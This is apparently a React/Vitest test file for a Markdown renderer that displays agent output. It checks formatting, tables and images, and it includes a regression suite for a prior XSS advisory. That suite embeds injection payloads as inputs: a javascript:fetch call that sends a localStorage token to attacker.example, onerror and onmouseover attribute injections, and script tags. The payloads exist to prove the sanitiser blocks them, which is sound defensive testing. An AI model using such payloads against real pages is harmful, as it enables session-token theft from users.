import { fireEvent, render } from "@testing-library/react";
import { describe, expect, it, vi } from "vitest";
import { Markdown } from "./markdown";

// Expected markup comes from md() in the old public/app.js.
const html = (src: string) => render(<Markdown src={src} />).container.innerHTML;

describe("Markdown", () => {
  it("renders headings, capped at h3", () => {
    expect(html("# Title\n\n## Sub\n\n#### Deep")).toBe("<h1>Title</h1><h2>Sub</h2><h3>Deep</h3>");
  });
  it("renders unordered and ordered lists", () => {
    expect(html("- a\n- b **bold**\n\n1. one\n2) two")).toBe(
      "<ul><li>a</li><li>b <b>bold</b></li></ul><ol><li>one</li><li>two</li></ol>",
    );
  });
  it("renders a fenced block with a language as plain code", () => {
    expect(html("```rust\nfn main() {}\n```")).toBe("<pre><code>fn main() {}</code></pre>");
  });
  it("renders inline code, italics and bold", () => {
    expect(html("use `x < y` and _it_ and *em* and **b**")).toBe(
      "<p>use <code>x &lt; y</code> and <i>it</i> and <i>em</i> and <b>b</b></p>",
    );
  });
  it("opens links in a new tab with rel noopener", () => {
    expect(html("see [site](https://example.com/a?b=1&c=2) now")).toBe(
      '<p>see <a href="https://example.com/a?b=1&amp;c=2" target="_blank" rel="noopener">site</a> now</p>',
    );
  });
  it("does not make a link of a javascript: url", () => {
    const { container } = render(<Markdown src="[x](javascript:alert(1))" />);
    expect(container.querySelector("a")).toBeNull();
  });
  it("renders quotes and keeps line breaks", () => {
    expect(html("> quote\n> more")).toBe("<blockquote><p>quote<br>more</p></blockquote>");
  });
  it("renders a table with a bar and right-aligned figures", () => {
    const { container } = render(<Markdown src={"| A | B |\n|---|---|\n| x | 12% |\n| y | 3 |"} />);
    expect(container.querySelector(".tbar span")?.textContent).toBe("2 rows · 2 columns");
    expect([...container.querySelectorAll("th")].map((c) => c.textContent)).toEqual(["A", "B"]);
    const cells = [...container.querySelectorAll("td")];
    expect(cells.map((c) => c.textContent)).toEqual(["x", "12%", "y", "3"]);
    expect(cells.map((c) => c.className)).toEqual(["", "num", "", "num"]);
    expect(container.querySelector("button.tablex")?.getAttribute("aria-label")).toBe("Open the table");
  });
  it("gives long table cells room", () => {
    const { container } = render(<Markdown src={`| A |\n|---|\n| ${"w".repeat(30)} |`} />);
    expect(container.querySelector("td")?.className).toBe("long");
  });
  it("calls onTable with the table when Open is pressed", () => {
    const onTable = vi.fn();
    const { container } = render(<Markdown src={"| A |\n|---|\n| x |"} onTable={onTable} />);
    fireEvent.click(container.querySelector("button.tablex")!);
    expect(onTable).toHaveBeenCalledWith(container.querySelector("table"));
  });
  it("renders an image link as a picture and reports a tap", () => {
    const onPic = vi.fn();
    const { container } = render(<Markdown src="![shot](/image/abc?x=1&y=2) and ![d](https://e.com/p.png)" onPic={onPic} />);
    const imgs = container.querySelectorAll("img.pic");
    expect(imgs).toHaveLength(2);
    expect(imgs[0].getAttribute("src")).toBe("/image/abc?x=1&y=2");
    expect(imgs[0].getAttribute("alt")).toBe("shot");
    expect(imgs[0].getAttribute("loading")).toBe("lazy");
    fireEvent.click(imgs[1]);
    expect(onPic).toHaveBeenCalledWith("https://e.com/p.png", "d");
  });
  it("draws a picture with renderPic when given", () => {
    const renderPic = (url: string, alt: string) => <span className="mine" data-url={url} data-alt={alt} />;
    const { container } = render(<Markdown src="see ![a](/image/1)" renderPic={renderPic} />);
    expect(container.querySelector("img")).toBeNull();
    const mine = container.querySelector(".mine")!;
    expect([mine.getAttribute("data-url"), mine.getAttribute("data-alt")]).toEqual(["/image/1", "a"]);
  });
  it("shows a script tag as text", () => {
    const { container } = render(<Markdown src={"<script>alert(1)</script> hi\nnext line"} />);
    expect(container.querySelector("script")).toBeNull();
    expect(container.innerHTML).toBe("<p>&lt;script&gt;alert(1)&lt;/script&gt; hi<br>next line</p>");
  });
  it("shows html in a heading, a cell and a link label as text", () => {
    const { container } = render(<Markdown src={"# <img src=x onerror=1>\n\n| <b>h</b> |\n|---|\n| <i>c</i> |\n\n[<u>l</u>](https://a.b)"} />);
    expect(container.querySelector("img, b, i, u")).toBeNull();
  });
  it("asks onDiagram for a closed fence, and falls back to code", () => {
    const onDiagram = vi.fn((lang: string) => (lang === "chart" ? <figure>drawn</figure> : null));
    const { container } = render(<Markdown src={"```chart\nx\n```\n\n```text\ny\n```"} onDiagram={onDiagram} />);
    expect(onDiagram).toHaveBeenCalledTimes(2);
    expect(container.querySelector("figure")?.textContent).toBe("drawn");
    expect(container.querySelector("pre code")?.textContent).toBe("y");
  });
  it("does not draw a fence that is still streaming in", () => {
    const onDiagram = vi.fn(() => <figure />);
    const { container } = render(<Markdown src={"```chart\nx"} onDiagram={onDiagram} />);
    expect(onDiagram).not.toHaveBeenCalled();
    expect(container.querySelector("pre code")?.textContent).toBe("x");
  });
  it("survives control characters that look like its own markers", () => {
    for (const src of ["a \u00021\u0002 b", "a \u00019\u0001 b", "a \u00000\u0000 b", "a \u00031\u0003 b"]) {
      const { container } = render(<Markdown src={src} />);
      expect(container.textContent).toContain("a ");
      expect(container.textContent).toContain(" b");
    }
  });

  // Agent text is untrusted (a repository or a web page can steer it). These
  // came with the fix for GHSA-756p-frh7-w9cw in the old renderer.
  describe("untrusted text", () => {
    const allowed: Record<string, string[]> = {
      a: ["href", "target", "rel"],
      img: ["src", "alt", "class", "loading"],
    };
    // Every element is one the renderer makes, with only its own attributes,
    // and a link goes to a web address with nothing of the renderer's in it.
    // React escapes quotes in attributes, so unlike the old test a quote in an
    // address is allowed.
    const assertSafe = (container: HTMLElement) => {
      for (const el of container.querySelectorAll("*")) {
        const tag = el.tagName.toLowerCase();
        for (const a of el.getAttributeNames()) expect(allowed[tag] ?? ["class", "aria-label", "type"], `<${tag}> got ${a}=`).toContain(a);
        if (tag === "a") expect(el.getAttribute("href")).toMatch(/^https?:\/\/[^\s<\u0000-\u0003]*$/);
      }
    };
    const draw = (src: string) => render(<Markdown src={src} />).container;

    it("keeps an image inside a link's address out of the link", () => {
      const c = draw(
        '[Open the build log](https://example.com/![javascript:fetch("https://attacker.example/?t="+localStorage.getItem("arakun.token"))](/onpointerdown=location=this.attributes.alt.value//))',
      );
      assertSafe(c);
      expect(c.querySelector("a")).toBeNull();
      const img = c.querySelector("img")!;
      expect(img.getAttribute("src")).toBe("/onpointerdown=location=this.attributes.alt.value//");
      expect(img.getAttribute("alt")).toMatch(/^javascript:fetch\("/);
    });
    it("keeps code inside a link's address out of the href", () => {
      const c = draw("[log](https://example.com/`x`)");
      assertSafe(c);
      expect(c.querySelector("a")).toBeNull();
      expect(c.querySelector("code")?.textContent).toBe("x");
    });
    it("keeps bold inside a link's address out of the href", () => {
      const c = draw("[x](https://e.com/**b**)");
      assertSafe(c);
      expect(c.querySelector("a")).toBeNull();
      expect(c.querySelector("b")?.textContent).toBe("b");
    });
    it("does not let agent text bring its own placeholders", () => {
      for (const forged of ["\u00010\u0001", "\u00009\u0000", "![a](/a.png) \u00010\u0001", "[x](https://e.com/\u00010\u0001)"]) {
        const c = draw(forged);
        assertSafe(c);
        expect(c.textContent).not.toContain("undefined");
        expect(c.querySelectorAll("img").length).toBeLessThanOrEqual(1);
      }
    });
    it("still renders links, images and code", () => {
      expect(html("[docs](https://arakun.dev/a?b=1&c=2)")).toBe('<p><a href="https://arakun.dev/a?b=1&amp;c=2" target="_blank" rel="noopener">docs</a></p>');
      const img = draw("![plot](/image/p.png?sig=a&t=1)").querySelector("img.pic")!;
      expect([img.getAttribute("src"), img.getAttribute("alt")]).toEqual(["/image/p.png?sig=a&t=1", "plot"]);
      expect(html("run `a < b` now")).toBe("<p>run <code>a &lt; b</code> now</p>");
      // A picture as the text of a link is still a picture in a link.
      const linked = draw("[![logo](https://arakun.dev/l.png)](https://arakun.dev/)");
      assertSafe(linked);
      expect(linked.querySelector("a")?.getAttribute("href")).toBe("https://arakun.dev/");
      expect(linked.querySelector("a > img.pic")?.getAttribute("src")).toBe("https://arakun.dev/l.png");
    });
    it("keeps attribute quotes in agent text as text", () => {
      for (const src of [
        '[x](https://e.com/"onmouseover="alert(1))',
        '![x" onerror="alert(1)](/a.png)',
        '![x](/a.png"onerror=alert(1))',
        '**[x](https://e.com/**"**)**',
        "<img src=x onerror=alert(1)>",
      ]) {
        assertSafe(draw(src));
      }
    });
  });
});
